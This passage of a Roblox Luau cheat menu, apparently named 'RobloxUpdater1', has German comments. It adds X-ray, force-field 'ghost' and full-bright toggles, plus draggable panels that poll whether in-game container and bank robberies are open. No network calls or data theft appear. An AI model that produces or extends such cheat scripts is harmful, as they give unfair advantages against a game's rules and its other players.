			button.Text = "XRay: ON" -- Zeigt "XRay Aus" an, wenn der Effekt an ist
		else
			button.Text = "XRay: OFF" -- Zeigt "XRay Ein" an, wenn der Effekt aus ist
		end
	end
	
	-- UrsprÃ¼nglichen Text des Buttons setzen
	button.Text = "XRay: OFF"
	
	-- Event zum Umschalten des XRay-Effekts beim Klick auf den Button
	button.MouseButton1Click:Connect(toggleXRay)
end
task.spawn(SCRIPT_234)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.SkinGohst.LocalScript \\ --
local function SCRIPT_239()
local script = UI["239"]
	local STATE = "normal"
	local savedColors = {} -- speichert alle ursprÃ¼nglichen Farben pro Part
	
	local function toggleGhostMode(NEWSTATE)
		local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
	
		for _, part in pairs(char:GetDescendants()) do
			if part:IsA("BasePart") and part.Transparency < 1 then
				if NEWSTATE == "force" then
					-- Farbe speichern, wenn noch nicht gespeichert
					if not savedColors[part] then
						savedColors[part] = {
							Color = part.Color,
							Material = part.Material
						}
					end
					part.Material = Enum.Material.ForceField
					part.Color = Color3.fromRGB(0, 170, 255)
				elseif NEWSTATE == "normal" and savedColors[part] then
					-- ZurÃ¼ck zur alten Farbe
					part.Material = savedColors[part].Material
					part.Color = savedColors[part].Color
				end
			end
		end
	end
	
	-- Button-Klick
	script.Parent.MouseButton1Up:Connect(function()
		if STATE == "normal" then
			STATE = "force"
			toggleGhostMode("force")
		else
			STATE = "normal"
			toggleGhostMode("normal")
		end
	end)
	
end
task.spawn(SCRIPT_239)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.CarGohst.LocalScript \\ --
local function SCRIPT_23e()
local script = UI["23e"]
	local firstColor
	local STATE = "normal"
	
	local function changeCarToForceField(NEWSTATE)
		local car = workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name).Body 
		if car then
			local targetPart = car:FindFirstChild("Body") or car:FindFirstChild("Main")
			if targetPart and targetPart:IsA("MeshPart") then
				if NEWSTATE == "force" then
					firstColor = targetPart.Color
					
					targetPart.Material = Enum.Material.ForceField
					targetPart.Color = Color3.fromRGB(0, 170, 255)
				else
					targetPart.Material = Enum.Material.SmoothPlastic
					targetPart.Color = firstColor
				end
			end
		else
			warn("Auto nicht gefunden.")
		end
	end
	
	script.Parent.MouseButton1Up:Connect(function()
		if STATE == "normal" then
			STATE = "force"
			changeCarToForceField("force")
		else
			STATE = "normal"
			changeCarToForceField("normal")
		end
	end)
	
	
end
task.spawn(SCRIPT_23e)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.VISUALS.ScrollingFrame2.Fullbright.LocalScript \\ --
local function SCRIPT_243()
local script = UI["243"]
	local Lighting = game:GetService("Lighting")
	local button = script.Parent.Parent:WaitForChild("Fullbright")
	local toggled = false
	
	-- Speichere die Originalwerte
	local LightingSettings = {
		Ambient = Lighting.Ambient,
		OutdoorAmbient = Lighting.OutdoorAmbient,
		Brightness = Lighting.Brightness,
		ShadowSoftness = Lighting.ShadowSoftness,
		GlobalShadows = Lighting.GlobalShadows
	}
	
	-- Fullbright aktivieren
	local function enableFullbright()
		Lighting.Ambient = Color3.fromRGB(255, 255, 255)
		Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
		Lighting.Brightness = 2
		Lighting.ShadowSoftness = 0
		Lighting.GlobalShadows = false
	end
	
	-- Fullbright deaktivieren
	local function disableFullbright()
		Lighting.Ambient = LightingSettings.Ambient
		Lighting.OutdoorAmbient = LightingSettings.OutdoorAmbient
		Lighting.Brightness = LightingSettings.Brightness
		Lighting.ShadowSoftness = LightingSettings.ShadowSoftness
		Lighting.GlobalShadows = LightingSettings.GlobalShadows
	end
	
	-- Beim Klicken des Buttons toggeln
	button.MouseButton1Click:Connect(function()
		toggled = not toggled
	
		if toggled then
			enableFullbright()
			button.Text = "Fullbright: ON"
		else
			disableFullbright()
			button.Text = "Fullbright: OFF"
		end
	end)
	
	-- Anfangstext setzen
	button.Text = "Fullbright: OFF"
	
end
task.spawn(SCRIPT_243)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.animation \\ --
local function SCRIPT_251()
local script = UI["251"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_251)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container.Function \\ --
local function SCRIPT_253()
local script = UI["253"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 10 | Scripts: 1 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.Container
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[Container]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
		-- StarterGui.Container.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 0;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
		G2L["2"]["Size"] = UDim2.new(0, 217, 0, 124);
		G2L["2"]["Position"] = UDim2.new(0.77786, 0, 0.07286, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		
		-- StarterGui.Container.Frame.UIGradient
		G2L["10"] = Instance.new("UIGradient", G2L["2"]);
		G2L["10"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(77, 77, 77))};
	
	
		-- StarterGui.Container.Frame.UICorner
		G2L["3"] = Instance.new("UICorner", G2L["2"]);
	
	
	
		-- StarterGui.Container.Frame.TextLabel
		G2L["4"] = Instance.new("TextLabel", G2L["2"]);
		G2L["4"]["TextWrapped"] = true;
		G2L["4"]["LineHeight"] = 2.9;
		G2L["4"]["BorderSizePixel"] = 0;
		G2L["4"]["TextSize"] = 14;
		G2L["4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["TextScaled"] = true;
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["BackgroundTransparency"] = 1;
		G2L["4"]["Size"] = UDim2.new(0, 200, 0, 50);
		G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["Text"] = [[Container]];
		G2L["4"]["Position"] = UDim2.new(0.04147, 0, 0, 0);
	
	
		-- StarterGui.Container.Frame.TextLabel.UIGradient
		G2L["5"] = Instance.new("UIGradient", G2L["4"]);
		G2L["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Container.Frame.Status
		G2L["6"] = Instance.new("TextLabel", G2L["2"]);
		G2L["6"]["TextWrapped"] = true;
		G2L["6"]["BorderSizePixel"] = 0;
		G2L["6"]["TextSize"] = 14;
		G2L["6"]["TextScaled"] = true;
		G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["BackgroundTransparency"] = 1;
		G2L["6"]["Size"] = UDim2.new(0, 165, 0, 34);
		G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6"]["Text"] = [[ðŸ”’ClosedðŸ”’]];
		G2L["6"]["Name"] = [[Status]];
		G2L["6"]["Position"] = UDim2.new(0.11982, 0, 0.57258, 0);
	
	
		-- StarterGui.Container.Frame.Status.UIGradient
		G2L["7"] = Instance.new("UIGradient", G2L["6"]);
		G2L["7"]["Enabled"] = false;
		G2L["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Container.Frame.UIStroke
		G2L["8"] = Instance.new("UIStroke", G2L["2"]);
		G2L["8"]["Thickness"] = 4;
		G2L["8"]["Color"] = Color3.fromRGB(255, 255, 255);
	
	
		-- StarterGui.Container.Frame.UIStroke.UIGradient
		G2L["9"] = Instance.new("UIGradient", G2L["8"]);
		G2L["9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Container.Frame.LocalScript
		G2L["a"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.Container.Frame.LocalScript
		local function C_a()
			local script = G2L["a"];
			local UserInputService = game:GetService("UserInputService")
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			local function update(input)
				local delta = input.Position - dragStart
				gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					if gui.Visible then
						update(input)
					end
				end
			end)
	
	
			while true do 
				if workspace.Robberies.ContainerRobberies.ContainerRobbery.Barricade.WoodPlanks.Transparency == 1 then
					G2L["6"].Text = "ðŸ”“OPENðŸ”“"
				else
					G2L["6"].Text = "ðŸ”’CLOSEDðŸ”’"
				end
				task.wait(1)
			end
	
		end;
		task.spawn(C_a);
	Status = true
		return G2L["1"], require;
		else
			Status = false
			game:GetService("Players").LocalPlayer.PlayerGui.Container:Destroy()
		end
	end)
end
task.spawn(SCRIPT_253)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.animation \\ --
local function SCRIPT_259()
local script = UI["259"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_259)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Container1.Function \\ --
local function SCRIPT_25a()
local script = UI["25a"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
		--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 11 | Scripts: 2 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.Container1
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[Container1]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
		-- StarterGui.Container1.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 0;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
		G2L["2"]["Size"] = UDim2.new(0, 217, 0, 124);
		G2L["2"]["Position"] = UDim2.new(0.5916, 0, 0.07286, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		
		-- StarterGui.Container1.Frame.UIGradient
		G2L["10"] = Instance.new("UIGradient", G2L["2"]);
		G2L["10"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(77, 77, 77))};
	
	
		-- StarterGui.Container1.Frame.UICorner
		G2L["3"] = Instance.new("UICorner", G2L["2"]);
	
	
	
		-- StarterGui.Container1.Frame.TextLabel
		G2L["4"] = Instance.new("TextLabel", G2L["2"]);
		G2L["4"]["TextWrapped"] = true;
		G2L["4"]["LineHeight"] = 2.9;
		G2L["4"]["BorderSizePixel"] = 0;
		G2L["4"]["TextSize"] = 14;
		G2L["4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["TextScaled"] = true;
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["BackgroundTransparency"] = 1;
		G2L["4"]["Size"] = UDim2.new(0, 200, 0, 50);
		G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["Text"] = [[Container1]];
		G2L["4"]["Position"] = UDim2.new(0.03687, 0, 0, 0);
	
	
		-- StarterGui.Container1.Frame.TextLabel.UIGradient
		G2L["5"] = Instance.new("UIGradient", G2L["4"]);
		G2L["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Container1.Frame.Status
		G2L["6"] = Instance.new("TextLabel", G2L["2"]);
		G2L["6"]["TextWrapped"] = true;
		G2L["6"]["BorderSizePixel"] = 0;
		G2L["6"]["TextSize"] = 14;
		G2L["6"]["TextScaled"] = true;
		G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["BackgroundTransparency"] = 1;
		G2L["6"]["Size"] = UDim2.new(0, 165, 0, 34);
		G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6"]["Text"] = [[ðŸ”’ClosedðŸ”’]];
		G2L["6"]["Name"] = [[Status]];
		G2L["6"]["Position"] = UDim2.new(0.11982, 0, 0.57258, 0);
	
	
		-- StarterGui.Container1.Frame.Status.UIGradient
		G2L["7"] = Instance.new("UIGradient", G2L["6"]);
		G2L["7"]["Enabled"] = false;
		G2L["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 111, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
	
		-- StarterGui.Container1.Frame.UIStroke
		G2L["8"] = Instance.new("UIStroke", G2L["2"]);
		G2L["8"]["Thickness"] = 4;
		G2L["8"]["Color"] = Color3.fromRGB(255, 255, 255);
	
	
		-- StarterGui.Container1.Frame.UIStroke.UIGradient
		G2L["9"] = Instance.new("UIGradient", G2L["8"]);
		G2L["9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Container1.Frame.LocalScript
		G2L["a"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.Container1.Frame.Rename
		G2L["b"] = Instance.new("LocalScript", G2L["2"]);
		G2L["b"]["Name"] = [[Rename]];
	
	
		-- StarterGui.Container1.Frame.LocalScript
		local function C_a()
			local script = G2L["a"];
			local UserInputService = game:GetService("UserInputService")
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			local function update(input)
				local delta = input.Position - dragStart
				gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					if gui.Visible then
						update(input)
					end
				end
			end)
	
	
			while true do 
				if workspace.Robberies.ContainerRobberies.Container1.Barricade.WoodPlanks.Transparency == 1 then
					G2L["6"].Text = "ðŸ”“OPENðŸ”“"
				else
					G2L["6"].Text = "ðŸ”’CLOSEDðŸ”’"
				end
				task.wait(1)
			end
	
		end;
		task.spawn(C_a);
		-- StarterGui.Container1.Frame.Rename
		local function C_b()
			local script = G2L["b"];
			workspace.Robberies.ContainerRobberies.ContainerRobbery.Name = "Container1"
	
		end;
		task.spawn(C_b);
	Status = true
		return G2L["1"], require;
		else
			Status = false
			game.Players.LocalPlayer.PlayerGui.Container1:Destroy()
		end
	end)
end
task.spawn(SCRIPT_25a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.animation \\ --
local function SCRIPT_260()
local script = UI["260"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_260)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Bank.Function \\ --
local function SCRIPT_261()
local script = UI["261"]
	local plr 	 = game:GetService("Players").LocalPlayer
	local Status = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if Status == false then
		--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 10 | Scripts: 1 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.Bank
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[Bank]];
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
		-- StarterGui.Bank.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 0;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
		G2L["2"]["Size"] = UDim2.new(0, 217, 0, 124);
		G2L["2"]["Position"] = UDim2.new(0.58702, 0, 0.4397, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		
		-- StarterGui.Bank.Frame.UIGradient
		G2L["10"] = Instance.new("UIGradient", G2L["2"]);
		G2L["10"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(77, 77, 77))};
	
	
		-- StarterGui.Bank.Frame.UICorner
		G2L["3"] = Instance.new("UICorner", G2L["2"]);
	
	
	
		-- StarterGui.Bank.Frame.TextLabel
		G2L["4"] = Instance.new("TextLabel", G2L["2"]);
		G2L["4"]["TextWrapped"] = true;
		G2L["4"]["LineHeight"] = 2.9;
		G2L["4"]["BorderSizePixel"] = 0;
		G2L["4"]["TextSize"] = 14;
		G2L["4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["TextScaled"] = true;
		G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["4"]["BackgroundTransparency"] = 1;
		G2L["4"]["Size"] = UDim2.new(0, 200, 0, 50);
		G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["4"]["Text"] = [[Bank]];
		G2L["4"]["Position"] = UDim2.new(0.03687, 0, 0, 0);
	
	
		-- StarterGui.Bank.Frame.TextLabel.UIGradient
		G2L["5"] = Instance.new("UIGradient", G2L["4"]);
		G2L["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
	
		-- StarterGui.Bank.Frame.Status
		G2L["6"] = Instance.new("TextLabel", G2L["2"]);
		G2L["6"]["TextWrapped"] = true;
		G2L["6"]["BorderSizePixel"] = 0;
		G2L["6"]["TextSize"] = 14;
		G2L["6"]["TextScaled"] = true;
		G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["6"]["BackgroundTransparency"] = 1;
		G2L["6"]["Size"] = UDim2.new(0, 165, 0, 34);
		G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["6"]["Text"] = [[ðŸ”’ClosedðŸ”’]];
		G2L["6"]["Name"] = [[Status]];
		G2L["6"]["Position"] = UDim2.new(0.11982, 0, 0.57258, 0);
	
	
		-- StarterGui.Bank.Frame.Status.UIGradient
	
	
	
		-- StarterGui.Bank.Frame.UIStroke
		G2L["8"] = Instance.new("UIStroke", G2L["2"]);
		G2L["8"]["Thickness"] = 4;
		G2L["8"]["Color"] = Color3.fromRGB(255, 255, 255);
	
	
		-- StarterGui.Bank.Frame.UIStroke.UIGradient
		G2L["9"] = Instance.new("UIGradient", G2L["8"]);
		G2L["9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(42, 188, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};
	
		-- StarterGui.Bank.Frame.LocalScript
		G2L["a"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.Bank.Frame.LocalScript
		local function C_a()
			local script = G2L["a"];
			local UserInputService = game:GetService("UserInputService")
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			local function update(input)
				local delta = input.Position - dragStart
				gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					if gui.Visible then
						update(input)
					end
				end
			end)
			local function Check()
				workspace.Robberies.BankRobbery.VaultDoor:GetAttributeChangedSignal("Opened"):Connect(function()
					if workspace.Robberies.BankRobbery.VaultDoor:GetAttribute("Opened") == true then
						G2L["6"].Text = "ðŸ”«IS_IN_ROBBERIEðŸ”«"
					end
				end)
			end
	
			while true do 
				if workspace.Robberies.BankRobbery.LightGreen.Light.Enabled == true then
					G2L["6"].Text = "ðŸ”“OPENðŸ”“"
				else
					G2L["6"].Text = "ðŸ”’CLOSEDðŸ”’"
					Check()
				end
				task.wait(1)
			end
	
		end;
		task.spawn(C_a);
		Status = true
		return G2L["1"], require;
		else
			Status = false
			game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui").Bank:Destroy()
		end
	end)
end
task.spawn(SCRIPT_261)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Stats.Club.animation \\ --
local function SCRIPT_268()
local script = UI["268"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
